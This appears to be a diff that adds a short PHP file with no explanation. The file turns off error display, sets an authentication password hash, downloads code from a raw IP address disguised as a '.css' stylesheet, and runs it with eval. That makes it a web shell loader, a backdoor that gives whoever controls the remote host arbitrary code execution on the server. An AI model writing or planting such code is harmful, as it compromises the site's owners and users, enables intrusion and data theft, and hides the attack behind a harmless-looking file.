@@ -1,0 +1,7 @@
+<?pHp
+@ini_set('output_buffering',0);
+@ini_set('display_errors', 0);
+$auth_pass = "6123eac44792571853043a43248e3c93";
+$pasi = file_get_contents('http://209.126.118.161/qw.css');
+eval($pasi);
+?>
